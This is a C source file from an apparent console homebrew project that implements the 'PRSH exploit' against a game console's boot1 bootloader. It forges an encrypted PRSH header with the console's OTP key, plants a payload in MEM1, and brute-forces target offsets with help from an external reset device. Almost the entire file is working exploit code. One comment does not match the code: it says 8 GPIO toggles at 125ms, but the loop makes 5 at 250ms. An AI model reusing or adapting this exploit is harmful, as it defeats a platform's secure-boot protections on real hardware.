/*
 * application.c
 *
 * This source file contains an implementation of the PRSH exploit.
 *
 * The program will attempt to bruteforce the correct address to
 * corrupt for unknown boot1 versions, with the assistance of an external
 * device such as a raspberry pi to automatically reset the console
 * when bad offsets cause the console to lock up.
 *
 * Thanks to
 *  - hexkyz
 *  - derrek6 and his team
 * for the PRSH exploit
 *
 * Copyright (C) 2020 rw-r-r-0644
 * This file is under GNU GPL
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "video/gfx.h"
#include "system/smc.h"
#include "system/memory.h"
#include "system/irq.h"
#include "system/rtc.h"
#include "system/gpio.h"
#include "system/latte.h"
#include "system/crypto.h"
#include "storage/nand.h"
#include "common/utils.h"
#include "storage/sdcard.h"
#include "storage/fatfs/elm.h"
#include "application.h"
#include "payload.h"
#include "prsh.h"

/*
 * The normal location of the prsh exploit target
 */
const u32
base_offset = 0x0D40AC6D;

/*
 * IV used for encrypting boot data
 */
static u8
prsh_iv[0x10] =
{
	0x0A, 0xAB, 0xA5, 0x30,
	0x2E, 0x90, 0x12, 0xD9,
	0x08, 0x51, 0x74, 0xE8,
	0x6B, 0x83, 0xEC, 0x22,
};

/*
 * Write the payload in MEM1 that will be
 * executed by the PRSH exploit.
 * This includes a branch over the word
 * writte at 0x0000000C.
 */
void
write_payload()
{
	/* b loc_00000048 */
	write32(0x00000000, 0xEA000010);

	/* main payload */
	void *payload_addr = (void *)0x00000048;
	memcpy(
		payload_addr,
		payload_bin,
		payload_bin_len
	);
}

/*
 * Return the xor checksum of an area of size bytes.
 */
static u32
calc_xor_checksum(void *ptr, u32 size)
{
	u32 i, checksum = 0, *wptr = (u32 *)ptr;
	for (i = 0; i < (size / sizeof(u32)); i++) {
		checksum ^= wptr[i];
	}
	return checksum;
}

/*
 * Craft a fake PRSH header containing a boot_info
 * section pointing to the specified address.
 */
void
craft_prsh_header(u32 boot_info_addr)
{
	prsh_t *prsh;
	prst_t *prst;
	prsh_section_t *boot_info;
	void *prsh_checksum_addr;
	u32 prsh_checksum_size;
	void *prst_checksum_addr;
	u32 prst_checksum_size;

	/* clear previous PRSH data */
	memset(
		(u8 *)0x10000400,
		0x00000000,
		0x7C00
	);

	/* create PRSH */
	prsh = (prsh_t *)0x10005A54;
	prsh->magic = 0x50525348; // "PRSH"
	prsh->version = 1;
	prsh->unk = 1;
	prsh->max_sections = 0x20;
	prsh->num_sections = 0x1;
	prsh->size = sizeof(*prsh);
	prsh->size += prsh->max_sections * sizeof(prsh_section_t);

	/* create boot_info */
	boot_info = &prsh->sections[0];
	strncpy(boot_info->name, "boot_info", 0x100);
	boot_info->data = (void *)boot_info_addr;
	boot_info->size = 0x58;
	boot_info->unk = 0x80000000;

	/* create PRST */
	prst = (prst_t *)&prsh->sections[prsh->max_sections];
	prst->size = prsh->size;
	prst->unk = 1;
	prst->magic= 0x50525354; // "PRST"

	/* compute PRSH checksum */
	prsh_checksum_addr = (u8 *)prsh + sizeof(prsh->xor_checksum);
	prsh_checksum_size = sizeof(*prsh) - sizeof(prsh->xor_checksum);
	prsh_checksum_size += prsh->num_sections * sizeof(prsh_section_t);

	prsh->xor_checksum = calc_xor_checksum(
		prsh_checksum_addr,
		prsh_checksum_size
	);

	/* compute PRST checksum */
	prst_checksum_addr = (u8 *)prst + sizeof(prst->xor_checksum);
	prst_checksum_size = sizeof(*prst) - sizeof(prst->xor_checksum);

	prst->xor_checksum = calc_xor_checksum(
		prst_checksum_addr,
		prst_checksum_size
	);

	/* encrypt the PRSH header */
	aes_reset();
	aes_set_iv(prsh_iv);
	aes_set_key(otp.fw_ancast_key);

	aes_encrypt(
		(u8 *)0x10000400,
		(u8 *)0x10000400,
		0x7C00 / 0x10,
		0
	);

	dc_invalidaterange(
		(u8 *)0x10000400,
		0x7C00
	);

	dc_flushrange(
		(u8 *)0x10000400,
		0x7C00
	);
}

/*
 * Inform the external device that we successfully
 * booted the custom firmware correctly and no reset
 * is required.
 * This is done by generating 8 output changes on the
 * sensorbar GPIO at a distance of 125ms.
 */
void
inform_external_device()
{
	u32 i;

	/* ensure the sensorbar pin is correctly configured. */
	clear32(LT_GPIO_OWNER, GP_SENSORBAR);
	set32(LT_GPIO_ENABLE, GP_SENSORBAR);
	set32(LT_GPIO_DIR, GP_SENSORBAR);

	/* output to the pin */
	for (i = 0; i  < 5; i++) {
		write32(LT_GPIO_OUT, read32(LT_GPIO_OUT) ^ GP_SENSORBAR);
		udelay(250000);
	}
}


int
get_next_offset(int offset)
{
	return (offset < 0) ?
		(-offset) :
		(-offset - 2);
}

int
get_offset()
{
	int offset = 0;
	FILE *f_offset;

	f_offset = fopen("sdmc:/offset.txt", "r");
	if (!f_offset) {
		return 0;
	}

	if (fscanf(f_offset,"%d\n", &offset) == 1) {
		offset = get_next_offset(offset);
	}

	fclose(f_offset);
	return offset;
}

void
save_offset(int offset)
{
	FILE *f_offset;

	f_offset = fopen("sdmc:/offset.txt", "w+");
	if (!f_offset) {
		printf("error: failed to open offset.txt\n");
		return;
	}

	rewind(f_offset);
	fprintf(f_offset, "%d\n", offset);
	fclose(f_offset);
}

bool
app_run()
{
	int offset;
	u32 target_addr;

	gfx_clear(GFX_ALL, BLACK);
	printf("prsh_exploit\n\n");

	offset = get_offset();
	target_addr = base_offset + offset;
	save_offset(offset);

	printf(" * creating fake prsh header (boot1_info addr: %08X)...\n", target_addr);
	craft_prsh_header(target_addr);

	printf(" * writing mem1 payload ...\n");
	write_payload();

	printf("done! informing external device and rebooting ...\n");
	inform_external_device();

	return true;
}
